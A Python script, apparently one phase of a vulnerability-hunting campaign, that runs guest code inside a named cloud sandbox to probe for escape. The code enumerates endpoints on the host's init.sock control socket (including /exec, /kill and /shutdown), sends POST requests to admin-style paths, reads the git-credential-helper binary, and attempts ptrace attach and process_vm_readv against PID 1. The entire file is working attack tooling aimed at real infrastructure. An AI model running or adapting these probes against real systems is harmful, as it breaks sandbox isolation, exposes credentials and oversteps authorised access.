# -*- coding: utf-8 -*-
"""Phase26: init.sock HTTP API 枚举 + git-credential-helper + ptrace 探测"""
import sys, time
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_aCiW8kdYJwYLOY6KpXlqUrUqNEfq"  # fwtest11

GUEST = r'''
import socket, os, urllib.request, json

SOCK = '/run/vercel/share/init.sock'

def http(method, path, body=None):
    # raw HTTP over unix socket
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect(SOCK)
    req = '%s %s HTTP/1.1\r\nHost: init\r\nContent-Type: application/json\r\n' % (method, path)
    if body is not None:
        b = body if isinstance(body, bytes) else body.encode()
        req += 'Content-Length: %d\r\n' % len(b)
    req += 'Connection: close\r\n\r\n'
    if body is not None:
        req = req.encode() + b
    else:
        req = req.encode()
    s.sendall(req)
    try:
        r = s.recv(2000)
        first = r.split(b'\r\n', 1)[0]
        if b'404' not in first:
            print('[%s %s] -> %r' % (method, path, r[:400]), flush=True)
    except Exception as e:
        print('[%s %s] EXC %s' % (method, path, e), flush=True)
    s.close()

# 路径枚举
paths = ['/', '/health', '/healthz', '/status', '/api', '/api/health', '/v1', '/v2',
         '/info', '/version', '/env', '/environment', '/fs', '/file', '/exec', '/run',
         '/cmd', '/command', '/sandbox', '/network', '/network-policy', '/process',
         '/kill', '/exit', '/shutdown', '/restart', '/logs', '/metrics', '/debug',
         '/debug/pprof', '/config', '/metadata', '/mount', '/capabilities', '/events',
         '/ws', '/socket', '/ping', '/test', '/proxy', '/dns', '/resolv']
for p in paths:
    http('GET', p)

# 常见 API 前缀 + 方法
for p in ['/', '/api/v1', '/api/v2', '/internal', '/admin', '/system']:
    http('POST', p, '{}')

# git-credential-helper 内容
try:
    print('[git-helper]', open('/vercel/bin/git-credential-helper', 'rb').read()[:1500], flush=True)
except Exception as e:
    print('[git-helper] ERR %s' % e, flush=True)

# ptrace 探测 PID 1 (CapEff 全开, CAP_SYS_PTRACE?)
import ctypes
libc = ctypes.CDLL(None, use_errno=True)
r = libc.ptrace(16, 1, None, None)  # PTRACE_ATTACH=16
print('[ptrace attach pid1] rc=%d errno=%d' % (r, ctypes.get_errno()), flush=True)
if r == 0:
    import time
    time.sleep(1)
    libc.ptrace(17, 1, None, None)  # PTRACE_DETACH
    print('[ptrace] attach OK, detached', flush=True)

# process_vm_readv 读 PID1 内存 (try)
try:
    import ctypes
    class IOV(ctypes.Structure):
        _fields_ = [('base', ctypes.c_void_p), ('len', ctypes.c_size_t)]
    buf = ctypes.create_string_buffer(4096)
    iov = IOV(ctypes.cast(buf, ctypes.c_void_p), 4096)
    n = libc.process_vm_readv(1, ctypes.byref(iov), 1, None, 0, 0)
    print('[process_vm_readv pid1] n=%d errno=%d data=%r' % (n, ctypes.get_errno(), buf.raw[:200]), flush=True)
except Exception as e:
    print('[process_vm_readv] EXC %s' % e, flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg34.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg34.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=150000)
    print('cmd:', c, flush=True)
    print(r[:12000], flush=True)
